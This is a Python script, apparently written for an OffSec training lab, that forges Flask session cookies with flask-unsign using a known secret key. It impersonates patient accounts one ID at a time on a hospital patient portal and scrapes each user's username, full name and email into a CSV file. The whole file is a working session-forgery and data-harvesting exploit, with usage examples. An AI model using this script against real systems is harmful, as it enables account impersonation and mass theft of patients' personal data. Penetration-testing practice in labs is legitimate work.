#!/usr/bin/env python3
"""
Hospital Patient Portal User Scraper

This script scrapes user information from a hospital patient portal by:
1. Generating session cookies for each user ID using flask-unsign
2. Visiting both dashboard and settings pages for each user
3. Extracting username, first name, last name, and email
4. Saving results to a CSV file
"""

import subprocess
import requests
import csv
import sys
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json



COOKIE_TEMPLATE = {
    'authenticated': "True", 
    'role': 'patient', 
    'user_object': {
        'firstname': 'asdf', 
        'id': None,
        'lastname': 'asdf', 
        'password': 'irrelevant', 
        'username': 'irrelevant'
    }
}

def log(message, verbose):
    """Print log message if verbose logging is enabled"""
    if verbose:
        print(f"[LOG] {message}")

def generate_session_cookie(user_id, flask_secret, verbose):
    """Generate session cookie for a specific user ID using flask-unsign"""
    try:
        cookie_data = COOKIE_TEMPLATE.copy()
        cookie_data['user_object'] = COOKIE_TEMPLATE['user_object'].copy()
        cookie_data['user_object']['id'] = user_id
        
        cookie_json = json.dumps(cookie_data)
        log(cookie_json, verbose)
        cookie_json = cookie_json.replace("\"True\"","True")
        
        cmd = [
            'flask-unsign', 
            '--sign', 
            '--cookie', cookie_json,
            '--secret', flask_secret
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return result.stdout.strip()
        
    except subprocess.CalledProcessError as e:
        log(f"Error generating cookie for user {user_id}: {e}", verbose)
        return None
    except Exception as e:
        log(f"Unexpected error generating cookie for user {user_id}: {e}", verbose)
        return None

def extract_user_data(dashboard_soup, settings_soup, user_id, verbose):
    """Extract user data from both dashboard and settings page HTML"""
    user_data = {
        'user_id': user_id,
        'username': 'N/A',
        'first_name': 'N/A',
        'last_name': 'N/A',
        'email': 'N/A'
    }
    
    try:
        if settings_soup:
            
            name_element = settings_soup.find('h3', class_='text-xl font-semibold text-gray-900 mt-4')
            log("Before parsing name element", verbose)
            if name_element and name_element.get_text(strip=True):
                full_name = name_element.get_text(strip=True)
                log("Logging full name " + full_name, verbose)
                name_parts = full_name.split()
                if len(name_parts) >= 1:
                    user_data['first_name'] = name_parts[0]
                    if len(name_parts) > 1:
                        user_data['last_name'] = ' '.join(name_parts[1:])
                    else:
                        user_data['last_name'] = ''
            
            username_divs = settings_soup.find_all('div', class_='bg-gray-50 p-4 rounded-xl')
            for div in username_divs:
                label = div.find('label', string=lambda text: text and 'Username' in text)
                if label:
                    username_p = div.find('p', class_='text-lg font-semibold text-gray-900 ml-6')
                    if username_p and username_p.get_text(strip=True):
                        user_data['username'] = username_p.get_text(strip=True)
                    break
            
            email_divs = settings_soup.find_all('div', class_='bg-gray-50 p-4 rounded-xl')
            for div in email_divs:
                label = div.find('label', string=lambda text: text and 'Email Address' in text)
                if label:
                    email_p = div.find('p', class_='text-lg font-semibold text-gray-900 ml-6')
                    if email_p and email_p.get_text(strip=True):
                        user_data['email'] = email_p.get_text(strip=True)
                    break
        
    except Exception as e:
        log(f"Error extracting data for user {user_id}: {e}", verbose)
    
    return user_data

def scrape_user(base_url, user_id, flask_secret, verbose):
    """Scrape data for a single user"""
    log(f"Scraping user ID: {user_id}", verbose)
    
    session_cookie = generate_session_cookie(user_id, flask_secret, verbose)
    if session_cookie:
        log(f"Session cookie generated for user {user_id}", verbose)
        log(session_cookie, verbose)
    if not session_cookie:
        return {
            'user_id': user_id,
            'username': 'ERROR',
            'first_name': 'Cookie generation failed',
            'last_name': 'N/A',
            'email': 'N/A',
            'status': 'COOKIE_ERROR'
        }
    
    session = requests.Session()
    session.cookies.set('session', session_cookie)
    
    dashboard_soup = None
    settings_soup = None
    status = 'SUCCESS'
    
    try:
        dashboard_url = urljoin(base_url, f'/patients/home/{user_id}')
        log(f"Fetching dashboard: {dashboard_url}", verbose)
        
        dashboard_response = session.get(dashboard_url, timeout=10)
        if dashboard_response.status_code == 200:
            dashboard_soup = BeautifulSoup(dashboard_response.text, 'html.parser')
            log(f"Dashboard loaded successfully for user {user_id}", verbose)
        else:
            log(f"Dashboard returned status {dashboard_response.status_code} for user {user_id}", verbose)
            if dashboard_response.status_code in [404, 403]:
                status = f'HTTP_{dashboard_response.status_code}'
        
        settings_url = urljoin(base_url, '/patients/settings')
        log(f"Fetching settings: {settings_url}", verbose)
        
        settings_response = session.get(settings_url, timeout=10)
        if settings_response.status_code == 200:
            settings_soup = BeautifulSoup(settings_response.text, 'html.parser')
            log(f"Settings loaded successfully for user {user_id}", verbose)
        else:
            log(f"Settings returned status {settings_response.status_code} for user {user_id}", verbose)
            if settings_response.status_code in [404, 403] and status == 'SUCCESS':
                status = f'HTTP_{settings_response.status_code}'
        
    except requests.exceptions.RequestException as e:
        log(f"Network error for user {user_id}: {e}", verbose)
        status = 'NETWORK_ERROR'
    except Exception as e:
        log(f"Unexpected error for user {user_id}: {e}", verbose)
        status = 'UNKNOWN_ERROR'
    
    if settings_response.status_code == 200 and dashboard_response.status_code == 200:
        user_data = extract_user_data(dashboard_soup, settings_soup, user_id, verbose)
        user_data['status'] = status
    else:
        user_data = None
    return user_data

def main(base_url, flask_secret, starting_id, number_of_records, verbose):
    """Main function to scrape users and save to CSV"""
    print(f"Starting user scraper...")
    print(f"Base URL: {base_url}")
    print(f"Starting ID: {starting_id}")
    print(f"Number of records: {number_of_records}")
    print(f"Verbose logging: {verbose}")
    print("-" * 50)
    
    output_file = 'scraped_users.csv'
    fieldnames = ['user_id', 'username', 'first_name', 'last_name', 'email', 'status']
    
    with open(output_file, 'w', newline='', encoding='utf-8') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        
        for i in range(number_of_records):
            current_id = starting_id + i
            user_data = scrape_user(base_url, current_id, flask_secret, verbose)
            if not user_data is None:
                writer.writerow(user_data)
                print(f"User {current_id}: {user_data['first_name']} {user_data['last_name']} "
                    f"({user_data['username']}) - {user_data['status']}")
            else:
                log("There seems to be no data for ID: " + str(current_id), verbose)
    
    print("-" * 50)
    print(f"Scraping completed! Results saved to {output_file}")
    
    try:
        subprocess.run(['flask-unsign', '--help'], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("\nWARNING: flask-unsign is not available or not working properly.")
        print("Please install it using: pip install flask-unsign")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Scrape user information from a hospital patient portal",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python user_scraper.py http://www.sthubbins.offseclab.io secret123 1 50
  python user_scraper.py http://www.sthubbins.offseclab.io secret123 1 50 --verbose
        """
    )
    
    parser.add_argument('base_url', 
                       help='Base URL of the hospital portal (e.g., http://www.sthubbins.offseclab.io)')
    parser.add_argument('flask_secret', 
                       help='Flask secret key for signing session cookies')
    parser.add_argument('starting_id', 
                       type=int,
                       help='Starting user ID for scraping')
    parser.add_argument('number_of_records', 
                       type=int,
                       help='Number of user records to scrape')
    parser.add_argument('-v', '--verbose', 
                       action='store_true',
                       help='Enable verbose logging output')
    
    args = parser.parse_args()
    
    base_url = args.base_url.rstrip('/')
    main(base_url, args.flask_secret, args.starting_id, args.number_of_records, args.verbose)